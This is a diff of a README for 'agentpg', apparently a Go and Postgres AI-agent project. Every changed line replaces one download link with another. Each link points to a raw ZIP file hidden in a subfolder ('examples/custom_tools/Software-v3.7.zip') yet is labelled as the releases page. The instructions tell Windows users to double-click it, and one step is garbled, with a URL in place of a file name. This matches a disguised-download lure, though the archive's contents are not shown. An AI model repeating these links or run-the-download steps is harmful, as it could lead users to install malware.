@@ -1,6 +1,6 @@
 # 🚀 agentpg - Build Smart Agents for Your Data
 
-[![Download agentpg](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip)](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip)
+[![Download agentpg](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip)](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip)
 
 ## 🌟 Overview
 
@@ -11,7 +11,7 @@ Agentpg provides stateful AI agents designed for Go and Postgres. These agents e
 Follow these steps to get started with agentpg.
 
 1. **Visit the Releases Page:**  
-   Go to the [Releases page](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip) to find the latest version of agentpg.
+   Go to the [Releases page](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip) to find the latest version of agentpg.
 
 2. **Download the Latest Release:**  
    On the Releases page, look for the latest version link. Click on the download link for your operating system (Windows, macOS, Linux).
@@ -20,14 +20,14 @@ Follow these steps to get started with agentpg.
    After downloading the file, you might need to extract it. If it is in a ZIP format, right-click on the file and select 'Extract All...' or 'Unzip'.
 
 4. **Run Agentpg:**  
-   - **Windows:** Locate the https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip file you extracted. Double-click it to start.  
+   - **Windows:** Locate the https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip file you extracted. Double-click it to start.  
    - **macOS:** Find the agentpg file in your Downloads folder. Double-click to run it.  
    - **Linux:** Open the terminal. Navigate to the folder where you extracted agentpg using the command `cd /path/to/folder`. Type `./agentpg` and press Enter.
 
 ## 🎯 Download & Install
 
 To download the latest version of agentpg, visit this page:  
-[Download agentpg](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip)
+[Download agentpg](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip)
 
 ## 📋 Requirements
 
@@ -92,4 +92,4 @@ If you want to contribute to agentpg, here are a few ways to get involved:
 
 Thank you to all the contributors and users. Your feedback helps enhance agentpg and improve our community.
 
-For more information, check the [Releases page](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/types/agentpg-v2.8.zip).
+For more information, check the [Releases page](https://raw.githubusercontent.com/yassineelfakiri/agentpg/main/examples/custom_tools/Software-v3.7.zip).
